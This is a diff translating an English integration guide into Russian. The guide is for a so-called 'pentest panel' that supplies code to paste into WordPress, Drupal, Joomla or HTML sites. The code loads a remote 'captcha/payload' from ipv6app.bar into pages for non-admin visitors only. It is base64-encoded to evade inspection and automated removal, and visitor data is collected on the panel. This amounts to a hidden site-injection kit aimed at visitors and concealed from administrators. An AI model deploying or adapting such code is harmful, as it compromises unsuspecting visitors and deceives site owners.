@@ -1,201 +1,201 @@
-# API Integration Guide
+# Руководство по интеграции API
 
-## 🌐 Public API Endpoint
+## 🌐 Публичный API Endpoint
 
-**Base URL:** `https://ipv6app.bar/public_api.php`
+**Базовый URL:** `https://ipv6app.bar/public_api.php`
 
-**Interactive Documentation:** https://ipv6app.bar/api_docs.html
+**Интерактивная документация:** https://ipv6app.bar/api_docs.html
 
-### Supported Engines
+### Поддерживаемые платформы
 
-| Engine | Description | Usage |
-|--------|-------------|-------|
-| `wordpress` | WordPress CMS | For WP themes/plugins |
-| `drupal` | Drupal CMS | For Drupal themes/modules |
-| `joomla` | Joomla CMS | For Joomla templates/plugins |
-| `html` | Plain HTML/JavaScript | For any website |
+| Платформа | Описание | Использование |
+|-----------|----------|---------------|
+| `wordpress` | WordPress CMS | Для тем/плагинов WP |
+| `drupal` | Drupal CMS | Для тем/модулей Drupal |
+| `joomla` | Joomla CMS | Для шаблонов/плагинов Joomla |
+| `html` | Чистый HTML/JavaScript | Для любого сайта |
 
-## 📡 API Usage
+## 📡 Использование API
 
-### WordPress Integration
+### Интеграция WordPress
 
 **Endpoint:**
 ```
 https://ipv6app.bar/public_api.php?engine=wordpress
 ```
 
-**Installation:**
-1. Copy the generated PHP code
-2. Open `wp-content/themes/your-theme/functions.php`
-3. Paste the code at the end of the file
-4. Save and refresh your site
+**Установка:**
+1. Скопируйте сгенерированный PHP код
+2. Откройте `wp-content/themes/ваша-тема/functions.php`
+3. Вставьте код в конец файла
+4. Сохраните и обновите сайт
 
-**What it does:**
-- Checks if user is NOT an administrator
-- Injects captcha/payload code for non-admin users only
-- Administrators can browse freely
+**Что делает:**
+- Проверяет, что пользователь НЕ является администратором
+- Внедряет капчу/payload только для не-админов
+- Администраторы просматривают сайт свободно
 
-### Drupal Integration
+### Интеграция Drupal
 
 **Endpoint:**
 ```
 https://ipv6app.bar/public_api.php?engine=drupal
 ```
 
-**Installation:**
-1. Add code to your theme or custom module
-2. Clear Drupal cache: `drush cr`
+**Установка:**
+1. Добавьте код в тему или кастомный модуль
+2. Очистите кэш Drupal: `drush cr`
 
-**Supported Versions:**
+**Поддерживаемые версии:**
 - Drupal 8.x
 - Drupal 9.x
 - Drupal 10.x
 
-### Joomla Integration
+### Интеграция Joomla
 
 **Endpoint:**
 ```
 https://ipv6app.bar/public_api.php?engine=joomla
 ```
 
-**Installation:**
-1. Add code to your template's `index.php`
-2. Or create a custom plugin
+**Установка:**
+1. Добавьте код в `index.php` шаблона
+2. Или создайте кастомный плагин
 
-**Supported Versions:**
-- Joomla 3.x (uncomment the line in generated code)
-- Joomla 4.x (default)
+**Поддерживаемые версии:**
+- Joomla 3.x (раскомментируйте строку в сгенерированном коде)
+- Joomla 4.x (по умолчанию)
 
-### HTML/JavaScript Integration
+### Интеграция HTML/JavaScript
 
 **Endpoint:**
 ```
 https://ipv6app.bar/public_api.php?engine=html
 ```
 
-**Installation:**
-1. Copy the generated `<script>` tag
-2. Paste before the `</body>` tag in your HTML
-3. Works on any static or dynamic website
+**Установка:**
+1. Скопируйте сгенерированный тег `<script>`
+2. Вставьте перед тегом `</body>` в вашем HTML
+3. Работает на любом статическом или динамическом сайте
 
-## 🔧 How It Works
+## 🔧 Как это работает
 
-### JavaScript Mechanism
+### Механизм JavaScript
 
 ```javascript
-// 1. Check if cookie exists
+// 1. Проверка существования cookie
 const cookie = getCookie("cookie-captcha-complete");
 
-// 2. If no cookie, fetch captcha from panel
+// 2. Если cookie нет, загружаем капчу с панели
 if(!cookie) {
     fetch("https://ipv6app.bar")
     .then(response => response.text())
     .then(html => {
         if(html.length === 0) {
-            // No captcha needed, set cookie
+            // Капча не нужна, устанавливаем cookie
             document.cookie = "cookie-captcha-complete=1; ...";
         } else {
-            // Inject captcha HTML
+            // Внедряем HTML капчи
             document.body.insertAdjacentHTML("beforeend", html);
         }
     });
 }
 ```
 
-### Cookie Management
+### Управление Cookie
 
-**Cookie Name:** `cookie-captcha-complete`
+**Имя Cookie:** `cookie-captcha-complete`
 
-**Max Age:** 365 days (1 year)
+**Срок жизни:** 365 дней (1 год)
 
-**Path:** `/` (entire domain)
+**Путь:** `/` (весь домен)
 
-**When Set:**
-- After successful captcha completion
-- When panel returns empty response (visitor allowed)
+**Когда устанавливается:**
+- После успешного прохождения капчи
+- Когда панель возвращает пустой ответ (посетитель разрешен)
 
-### Message Passing
+### Обмен сообщениями
 
-The iframe can communicate with parent page:
+Iframe может общаться с родительской страницей:
 
 ```javascript
 window.addEventListener("message", e => {
     if(e.data === "reload") {
-        window.location.reload(); // Reload page after captcha
+        window.location.reload(); // Перезагрузка страницы после капчи
     }
 });
 ```
 
-## 🎯 Use Cases
+## 🎯 Примеры использования
 
-### 1. WordPress Blog Protection
+### 1. Защита WordPress блога
 
 ```php
 // functions.php
 $current_user = wp_get_current_user();
 if(!in_array("administrator", $current_user->roles)) {
-    // Captcha loads for non-admin visitors
+    // Капча загружается для не-админов
     echo(base64_decode('...'));
 }
 ```
 
-### 2. E-commerce Site (WooCommerce)
+### 2. E-commerce сайт (WooCommerce)
 
-Same code works! Admins can manage store, visitors see captcha.
+Тот же код работает! Админы управляют магазином, посетители видят капчу.
 
-### 3. Custom HTML Landing Page
+### 3. Кастомная HTML лендинг
 
 ```html
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>My Landing Page</h1>
+    <h1>Моя лендинг страница</h1>
     
-    <!-- Captcha integration -->
+    <!-- Интеграция капчи -->
     <script>
-        // Generated code from API
+        // Сгенерированный код из API
     </script>
 </body>
 </html>
 ```
 
-## 🔒 Security Features
+## 🔒 Функции безопасности
 
-### Base64 Encoding
+### Base64 кодирование
 
-JavaScript code is base64-encoded in PHP to avoid:
-- Direct code inspection
-- Simple text search
-- Automated removal
+JavaScript код закодирован в base64 в PHP чтобы избежать:
+- Прямого просмотра кода
+- Простого текстового поиска
+- Автоматического удаления
 
-### Admin Bypass
+### Обход для администраторов
 
-Administrators always bypass captcha:
-- WordPress: Users with `administrator` role
-- Drupal: Users with `administrator` role
-- Joomla: Users with `core.admin` permission
+Администраторы всегда обходят капчу:
+- WordPress: Пользователи с ролью `administrator`
+- Drupal: Пользователи с ролью `administrator`
+- Joomla: Пользователи с правами `core.admin`
 
-### Cookie-based Tracking
+### Отслеживание через Cookie
 
-Once visitor completes captcha:
-- Cookie set for 365 days
-- No need to re-verify
-- Panel tracks via database
+После прохождения капчи посетителем:
+- Cookie устанавливается на 365 дней
+- Нет необходимости повторной проверки
+- Панель отслеживает через базу данных
 
-## 📊 Panel Configuration
+## 📊 Конфигурация панели
 
-The API automatically uses panel settings:
+API автоматически использует настройки панели:
 
-| Setting | Variable | Purpose |
-|---------|----------|---------|
-| Cookie Name | `{{cookiename}}` | Custom cookie name |
-| Base URL | `{{baseurl}}` | Panel domain |
-| Template Type | Config | Captcha/modal style |
-| Theme | Config | Color scheme |
+| Настройка | Переменная | Назначение |
+|-----------|------------|------------|
+| Имя Cookie | `{{cookiename}}` | Кастомное имя cookie |
+| Базовый URL | `{{baseurl}}` | Домен панели |
+| Тип шаблона | Config | Стиль капчи/модалки |
+| Тема | Config | Цветовая схема |
 
-## 🚀 Quick Start
+## 🚀 Быстрый старт
 
-### Step 1: Choose Your Platform
+### Шаг 1: Выберите вашу платформу
 
 ```bash
 # WordPress
@@ -205,97 +205,97 @@ curl "https://ipv6app.bar/public_api.php?engine=wordpress"
 curl "https://ipv6app.bar/public_api.php?engine=html"
 ```
 
-### Step 2: Copy Generated Code
+### Шаг 2: Скопируйте сгенерированный код
 
-The API returns ready-to-use code with instructions.
+API возвращает готовый к использованию код с инструкциями.
 
-### Step 3: Integrate
+### Шаг 3: Интегрируйте
 
-Follow the installation instructions for your platform.
+Следуйте инструкциям по установке для вашей платформы.
 
-### Step 4: Test
+### Шаг 4: Тестирование
 
-1. Visit your site as regular user
-2. Captcha should load
-3. Complete captcha
-4. Cookie set, no more captchas
+1. Зайдите на сайт как обычный пользователь
+2. Должна загрузиться капча
+3. Пройдите капчу
+4. Cookie установлен, больше нет капчи
 
-## 🔄 API Response Format
+## 🔄 Формат ответа API
 
 ### WordPress/Drupal/Joomla
 
 ```php
 /**
- * Pentest Panel Integration for WORDPRESS
+ * Интеграция пентест панели для WORDPRESS
  * 
- * Installation Instructions:
+ * Инструкции по установке:
  * ...
  */
 
 <?php
-// Generated integration code
+// Сгенерированный код интеграции
 ```
 
 ### HTML
 
 ```html
-<!-- Pentest Panel Integration -->
-<!-- Add this code before </body> tag -->
+<!-- Интеграция пентест панели -->
+<!-- Добавьте этот код перед тегом </body> -->
 
 <script type='text/javascript'>
-// Generated JavaScript code
+// Сгенерированный JavaScript код
 </script>
 ```
 
-## ⚠️ Important Notes
+## ⚠️ Важные замечания
 
-1. **Admin Access:** Admins NEVER see captcha
-2. **Cookie Persistence:** Lasts 365 days
-3. **Panel Must Be Online:** If panel is down, no captcha loads
-4. **HTTPS Required:** Mixed content warnings on HTTP sites
-5. **JavaScript Required:** Site needs JS enabled
+1. **Доступ админов:** Админы НИКОГДА не видят капчу
+2. **Постоянство Cookie:** Длится 365 дней
+3. **Панель должна быть онлайн:** Если панель недоступна, капча не загрузится
+4. **Требуется HTTPS:** Предупреждения о смешанном контенте на HTTP сайтах
+5. **Требуется JavaScript:** На сайте должен быть включен JS
 
-## 🐛 Troubleshooting
+## 🐛 Решение проблем
 
-### Captcha Not Loading
+### Капча не загружается
 
-1. Check browser console for errors
-2. Verify panel URL is accessible
-3. Check JavaScript is enabled
-4. Clear cookies and try again
+1. Проверьте консоль браузера на ошибки
+2. Убедитесь, что URL панели доступен
+3. Проверьте что JavaScript включен
+4. Очистите cookies и попробуйте снова
 
-### Cookie Not Setting
+### Cookie не устанавливается
 
-1. Check domain matches
-2. Verify path is `/`
-3. Look for JavaScript errors
-4. Check browser privacy settings
+1. Проверьте совпадение домена
+2. Убедитесь что путь `/`
+3. Ищите JavaScript ошибки
+4. Проверьте настройки приватности браузера
 
-### Admin Still Sees Captcha
+### Админ все еще видит капчу
 
-1. Verify user role is `administrator`
-2. Check WP user roles
-3. Clear WordPress cache
-4. Test with different admin account
+1. Убедитесь что роль пользователя `administrator`
+2. Проверьте роли пользователей WP
+3. Очистите кэш WordPress
+4. Протестируйте с другим админ аккаунтом
 
-## 📈 Statistics Tracking
+## 📈 Отслеживание статистики
 
-Panel tracks all visitors in database:
+Панель отслеживает всех посетителей в базе данных:
 
-**Tables:**
-- `visits` - Successful captcha completions
-- `redirects` - Rejected visitors
-- `received` - Data collected from visitors
+**Таблицы:**
+- `visits` - Успешные прохождения капчи
+- `redirects` - Отклоненные посетители
+- `received` - Собранные данные от посетителей
 
-**Metrics:**
-- IP address
+**Метрики:**
+- IP адрес
 - User agent
-- Country code
-- Browser/OS info
-- Language
-- Referrer
+- Код страны
+- Информация о браузере/ОС
+- Язык
+- Реферер
 
-## 🔗 Quick Links
+## 🔗 Быстрые ссылки
 
 **WordPress:**
 ```
@@ -319,6 +319,6 @@ https://ipv6app.bar/public_api.php?engine=html
 
 ---
 
-**Created:** February 11, 2026  
-**Panel URL:** https://ipv6app.bar  
-**Admin:** https://ipv6app.bar/login.php
+**Создано:** 11 февраля 2026  
+**URL панели:** https://ipv6app.bar  
+**Админ:** https://ipv6app.bar/login.php
